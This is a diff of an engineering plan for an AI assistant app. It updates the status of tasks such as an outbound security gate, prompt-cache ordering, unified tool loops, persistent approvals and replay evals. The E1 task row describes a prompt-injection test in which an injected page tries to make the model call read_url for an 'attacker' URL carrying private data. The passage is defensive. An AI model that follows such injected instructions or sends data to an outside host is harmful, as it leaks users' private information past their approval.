@@ -32,63 +32,63 @@
 6. One implementation per concern.
 7. No engine change merges without a test that would have caught the bug.
 
-## 3. Baseline — what the code does today
+## 3. Baseline — what the code does today (updated 2026-11-09)
 
 | Area | Today | Evidence |
 |---|---|---|
-| Untrusted content | Fenced in prompts; `read_url` and `read_file` run without approval, any URL, any path | `[code]` `AI/ReadingTools.swift:105`, `:151`; `AI/UntrustedContent.swift:45` |
-| Approval levels | `.medium`, `.high`, `.critical` all require approval | `[code]` `AI/AICapabilityRegistry.swift:18` (fixed in f2d3d5f, #44 closed) |
+| Untrusted content & outbound gate | Fenced in prompts (`UntrustedContent.fenced`); `OutboundGate.decide` asks before any outbound tool when a turn holds private data + untrusted content (E1/E1b/E1c) | `[code]` `AI/OutboundGate.swift`, `AI/UntrustedContent.swift`, `AI/ReadingTools.swift` (#149, #165, #187) |
+| Approval levels | `.medium`, `.high`, `.critical` all require approval (`.critical` hard-denied at `AICapabilityRegistry.swift:928`) | `[code]` `AI/AICapabilityRegistry.swift` (#44 closed) |
 | Question vs action | A question is answered, never offered as an action | `[code]` `AI/ScopedRoutePolicy.swift`, `Context-DockTests/QuestionNotAnOfferTests.swift` |
 | Read-back | A read-back that disagrees fails the step | `[code]` #139 / PR #142 |
-| Prompt order | Volatile sections (`resolvedContext`, `selection`) come before stable ones (`capabilities`, `reference`, `cli`); one cache mark on the whole system prompt | `[code]` `AI/ScopedPromptAssembler.swift:20`; `AI/AnthropicPromptCache.swift:27` |
-| Tool loops | Three near-copies (OpenAI, Anthropic, Gemini); max_tokens 8,192 vs 16,000 | `[code]` `AI/Providers/AIProviderToolLoops.swift:103`, `:305`, `:516`; `:327` |
-| Tool budget | On-device 8 tools, others 40; `find_capability` / `run_capability` always kept | `[code]` `AI/AIToolBudget.swift` |
-| On-device chat | `sendToOnDevice` takes `history` and never uses it; errors are returned as answer text; no `exceededContextWindowSize` handling | `[code]` `AI/AIProviderService.swift:853`, `:872` |
-| On-device tools | A new `LanguageModelSession` on every call | `[code]` `Services/OnDeviceToolBridge.swift:1209`, `:1264` |
-| Observability | Opt-in `turns.log`; token ledger per provider per day | `[code]` `Services/DoraXTurnLog.swift`; `AI/AITokenLedger.swift` |
-| Approvals | Held in memory (`@Published pending`); not restored after relaunch | `[code]` `AI/ApprovalCenter.swift:167` `[guess]` restart behaviour to confirm |
-| Evals | 148+ offline test files; retrieval benchmark (hit@5, MRR); no replay of real turns | `[code]` `Context-DockTests/`, `AI/RetrievalEvaluation.swift` |
+| Prompt order | Stable sections first (`sourceRule` … `cli`), volatile sections last (`workspace` … `memory`); dual `<!-- cache:breakpoint -->` markers (E3) | `[code]` `AI/ScopedPromptAssembler.swift`, `AI/AnthropicPromptCache.swift` (#151 / PR #382) |
+| Tool loops | Unified generic `runToolLoop<A: ToolLoopAdapter>` across OpenAI, Anthropic, Gemini; single `ToolLoopBudget.maxTokens(for:)` table; 2-round no-progress stop (E6a, E6b) | `[code]` `AI/Providers/AIProviderToolLoops.swift`, `AI/ToolLoopAdapter.swift` (#154 / PR #383, #155 / PR #389) |
+| Tool budget & focus | On-device 8 tools, others 40; per-round `TurnFocus` (`inspect` / `act` / `verify` / `answer`) narrows tools sent per round (E7a) | `[code]` `AI/AIToolBudget.swift` (#156 / PR #390) |
+| On-device chat | `sendToOnDevice` takes `history` and never uses it; errors are returned as answer text; no `exceededContextWindowSize` handling (queued: E5a #152, E5b #153) | `[code]` `AI/AIProviderService.swift` |
+| On-device tools | A new `LanguageModelSession` on every call; image input falls back to Vision OCR (queued: #152, #397) | `[code]` `Services/OnDeviceToolBridge.swift` |
+| Observability | Opt-in `turns.log` + per-turn OTel `turn.trace {json}` (`TurnRecorder.swift`, E2); token ledger per provider per day | `[code]` `Services/DoraXTurnLog.swift`, `Services/TurnRecorder.swift`, `AI/AITokenLedger.swift` (#150 / PR #170) |
+| Approvals | Persisted across app restarts in `Application Support/Context-Dock/pending-approvals.json` with idempotency receipts and 10-min stale expiry (E7b) | `[code]` `AI/PendingApprovalJournal.swift`, `AI/ApprovalCenter.swift` (#157 / PR #391) |
+| Evals | 359 offline test files; retrieval benchmark (hit@5, MRR); offline `ReplayCaseStore`, `ReplayRunner`, and heuristic `ReplayCaseJudge` (E8a–E8c) | `[code]` `Services/ReplayCase*.swift`, `Services/ReplayRunner.swift`, `Context-DockTests/` (#158–#160 / PRs #392–#394) |
 
 ## 4. Tasks for 1.0
 
 Sizes follow the issue rule: S ≤ ½ day, M ≤ 2 days, L is split.
 
-| # | Task | Done when | Lane | Size | After |
-|---|---|---|---|---|---|
-| **E1** #149 | Security gate: once a turn holds private data and untrusted content, outbound tools ask first | An injected page asking `read_url` for `https://attacker/?d=…` raises an approval card; a URL the user typed in the thread still runs; offline tests cover both | `AI/ReadingTools`, `AI/UntrustedContent`, `AI/ApprovalCenter` | M | — |
-| **E2** #150 | Recorder: per-turn trace in the turn log | One record per turn: tools sent vs called, rounds, tokens per round, cache-read tokens, characters per prompt section, verifier fires, latency; OpenTelemetry GenAI field names; still opt-in | `Services/DoraXTurnLog`, `AI/Providers` | M | — |
-| **E3** #151 | Prompt order: stable first, a second cache mark, volatile last | E2 shows the cache-read ratio rising on multi-turn Anthropic threads; offline suite green | `AI/ScopedPromptAssembler`, `AI/AnthropicPromptCache` | S | E2 |
-| E4 | ~~One "question or action?" gate~~ | **Done before this plan** — `ScopedRoutePolicy`, `QuestionNotAnOfferTests` | — | — | — |
-| **E5a** #152 | On-device: keep history, survive overflow, typed errors | A 10-turn on-device chat uses a fact from turn 2; `exceededContextWindowSize` → condense the transcript, new session, retry once; failures are errors, never answer text | `AI/AIProviderService`, `Services/OnDeviceToolBridge` | M | — |
-| **E5b** #153 | On-device: budget with `tokenCount` before sending | No overflow on the E5a test set | same | S | E5a |
-| **E6a** #154 | Tool loop: no-progress stop + one max_tokens table | Two rounds with nothing new end the loop; per-provider limits in one table | `AI/Providers/AIProviderToolLoops` | S | E2 |
-| **E6b** #155 | Tool loop: three loops become one | Adapters only translate request/response formats; offline suite green; no behaviour change in the E2 trace | same | M | E6a |
-| **E7a** #156 | Focus: inspect / act / verify / answer each send their own tool set | Tools sent per round drop in the E2 trace; "answer" sends none | `AI/AgentToolRegistry`, `AI/AIToolBudget` | M | E6b |
-| **E7b** #157 | Approvals survive quitting the app | A pending approval reappears after relaunch and the turn continues or is cleanly cancelled | `AI/ApprovalCenter` | M | — |
-| **E8a** #158 | Replay cases: record query, context and tool outputs from real turns | 50 cases on disk, private data stripped | `Services/DoraXTurnLog`, tests | M | E2; test host #65, #75, #77 |
-| **E8b** #159 | Replay runner: rule checks + retrieval metrics, offline | One command prints the pass rate before and after a change; includes 10 prompt-injection cases | `Context-DockTests/` | M | E8a |
-| **E8c** #160 | Replay judge for answer quality | Judge scores agree with the owner's hand grades on 20 cases | tests | S | E8b |
+| # | Task | Status | Done when | Lane | Size | After |
+|---|---|---|---|---|---|---|
+| **E1** #149 | Security gate: once a turn holds private data and untrusted content, outbound tools ask first (+ E1b #165, E1c #187) | ✅ Merged (#164, #175, #187) | An injected page asking `read_url` for `https://attacker/?d=…` raises an approval card; a URL the user typed in the thread still runs; offline tests cover both | `AI/OutboundGate`, `AI/UntrustedContent`, `AI/ApprovalCenter` | M | — |
+| **E2** #150 | Recorder: per-turn trace in the turn log | ✅ Merged (#170) | One record per turn: tools sent vs called, rounds, tokens per round, cache-read tokens, characters per prompt section, verifier fires, latency; OpenTelemetry GenAI field names; still opt-in | `Services/TurnRecorder`, `AI/Providers` | M | — |
+| **E3** #151 | Prompt order: stable first, a second cache mark, volatile last | ✅ Merged (#382) | E2 shows the cache-read ratio rising on multi-turn Anthropic threads; offline suite green | `AI/ScopedPromptAssembler`, `AI/AnthropicPromptCache` | S | E2 |
+| E4 | ~~One "question or action?" gate~~ | ✅ Done | **Done before this plan** — `ScopedRoutePolicy`, `QuestionNotAnOfferTests` | — | — | — |
+| **E5a** #152 | On-device: keep history, survive overflow, typed errors | ⏸ Needs owner E5 answer | A 10-turn on-device chat uses a fact from turn 2; `exceededContextWindowSize` → condense the transcript, new session, retry once; failures are errors, never answer text | `AI/AIProviderService`, `Services/OnDeviceToolBridge` | M | — |
+| **E5b** #153 | On-device: budget with `tokenCount` before sending | ⏸ Queued after E5a | No overflow on the E5a test set | same | S | E5a |
+| **E6a** #154 | Tool loop: no-progress stop + one max_tokens table | ✅ Merged (#383) | Two rounds with nothing new end the loop; per-provider limits in one table | `AI/Providers/AIProviderToolLoops` | S | E2 |
+| **E6b** #155 | Tool loop: three loops become one | ✅ Merged (#389) | Adapters only translate request/response formats; offline suite green; no behaviour change in the E2 trace | `AI/ToolLoopAdapter` | M | E6a |
+| **E7a** #156 | Focus: inspect / act / verify / answer each send their own tool set | ✅ Merged (#390) | Tools sent per round drop in the E2 trace; "answer" sends none | `AI/AgentToolRegistry`, `AI/AIToolBudget` | M | E6b |
+| **E7b** #157 | Approvals survive quitting the app | ✅ Merged (#391) | A pending approval reappears after relaunch and the turn continues or is cleanly cancelled | `AI/PendingApprovalJournal` | M | — |
+| **E8a** #158 | Replay cases: record query, context and tool outputs from real turns | ✅ Merged (#392) | 50 cases on disk, private data stripped | `Services/ReplayCase*`, tests | M | E2; test host #65, #75, #77 |
+| **E8b** #159 | Replay runner: rule checks + retrieval metrics, offline | ✅ Merged (#393) | One command prints the pass rate before and after a change; includes 10 prompt-injection cases | `Services/ReplayRunner`, `Context-DockTests/` | M | E8a |
+| **E8c** #160 | Replay judge for answer quality | 🟡 Built (#394, heuristic; open for owner) | Judge scores agree with the owner's hand grades on 20 cases | `Services/ReplayCaseJudge`, tests | S | E8b |
 
 Each task is one GitHub issue (#149–#160), created **without** the `ready` label. The builder only
 takes `ready` issues, so nothing starts until the owner labels one.
 
-## 5. Labs, after 1.0 (no issues yet)
+## 5. Labs & App Pets stages
 
-| # | Task | Notes |
-|---|---|---|
-| E9 | Three-tier memory: active provider context + full local transcript/rolling thread summary + verified per-Pet long memory | Old turns are summarized/retrieved, not dropped; user can inspect/edit/delete Pet memory; Combined Chat writes back only verified relevant facts |
-| E9a | Context-limit UX | Near a provider limit offer Keep active (condense), Archive and new chat, or New chat without saving memory; local transcript remains intact |
-| E9b | Pet modes (`/mods`) | Mode overlays instructions/tool emphasis/output shape inside the same thread; never changes scope, risk, approval or provider budgets |
-| E10 | Model policy per turn: privacy, availability, complexity; the user's setting is the ceiling | Folds in #70 (privacy routing settings) |
-| E11 | Parallel read tools | Measured with E2 |
-| E12 | Finish the capability index migration; retire old routers one at a time | `AI/CapabilityIndexShadow.swift`; #55, #57 |
-| E13 | Hybrid retrieval: `NLEmbedding` + reciprocal rank fusion (k = 60) | Ships only if hit@5 and MRR improve on E8 cases |
-| E14 | Graph gate: 30 real multi-hop questions from the turn log | No graph without them |
-| E15 | Knowledge graph: typed edges from receipts in SQLite + `graph_neighbors` | Replaces the dashboard-only `KnowledgeGraph` |
-| E16 | Nightly consolidation: dedupe facts, rebuild graph and embeddings | Extends `Services/BrainMaintenance.swift` |
-| E17 | Import the `SKILL.md` of CLIs the user installed (CLI-Anything convention: JSON output, `--help`, skill file) into the capability index, so `find_capability` finds them | Never bundled or installed by DoraX; every command is a write that asks; only after E1b (#165) |
-| E18 | Watch mode (= E19 layer 4): a scope notices things while you are away and leaves one suggestion. **Finder first**; Safari, then Mail/Calendar only after measured acceptance | Rules below. Needs E1b (#165), E7b (#157), E9 |
-| E19 | **App Assistant**: each app scope becomes a personal assistant for that app — remembers you, learns your routines, briefs you when you arrive, says what changed after an update | Plan in §5b. Pilot Finder + Mail. After 1.0 |
+| # | Task | Status | Notes |
+|---|---|---|---|
+| E9 | Three-tier memory: active provider context + full local transcript/rolling thread summary + verified per-Pet long memory | ✅ Merged (#340 / PR #361) | `AppPetMemoryController`, `CombinedWorkspaceMemory`, `ConversationMemoryProjector` |
+| E9a | Context-limit UX | ✅ Merged (#340 / PR #361) | Near a provider limit offer Keep active (condense), Archive and new chat, or New chat without saving memory; local transcript remains intact |
+| E9b | Pet modes (`/mods`) | ✅ Merged (#341 / PR #362) | `AppPetManifest`, `AppPetModeCommand`; mode overlays instructions/tool emphasis/output shape inside the same thread; never changes scope, risk, approval or provider budgets |
+| E10 | Model policy per turn: privacy, availability, complexity; the user's setting is the ceiling | Queued (Labs) | Folds in #70 (privacy routing settings) |
+| E11 | Parallel read tools | Queued (Labs) | Measured with E2 |
+| E12 | Finish the capability index migration; retire old routers one at a time | In progress (#204) | `AI/CapabilityIndexShadow.swift`; #55, #57, #204 |
+| E13 | Hybrid retrieval: `NLEmbedding` + reciprocal rank fusion (k = 60) | Queued (Labs) | Ships only if hit@5 and MRR improve on E8 cases |
+| E14 | Graph gate: 30 real multi-hop questions from the turn log | Queued (Labs) | No graph without them |
+| E15 | Knowledge graph: typed edges from receipts in SQLite + `graph_neighbors` | Queued (Labs) | Replaces the dashboard-only `KnowledgeGraph` |
+| E16 | Nightly consolidation: dedupe facts, rebuild graph and embeddings | Queued (Labs) | Extends `Services/BrainMaintenance.swift` |
+| E17 | Import the `SKILL.md` / `--help` of CLIs the user installed into the capability index | ✅ Merged (P8 #202 / PR #309) | Never bundled or installed by DoraX; every write command asks; after E1b (#165) |
+| E18 | Watch mode (= E19 layer 4): a scope notices things while you are away and leaves one suggestion | ✅ Merged (#343 / PR #366) | `AppPetProactivity.swift`, `HeadlessMonitoringBudgetTracker`, off by default per Pet |
+| E19 | **App Assistant**: each app scope becomes a personal assistant for that app — remembers you, learns your routines, briefs you when you arrive, says what changed after an update | Stages 1–6 shipped (#338–#343); solved skills extending via #405–#413 | Plan in §5b and `2026-11-09-agent-harness-model.md` |
 
 ### 5b. E19 App Assistant — the plan (owner confirmed 2026-10-04)
 
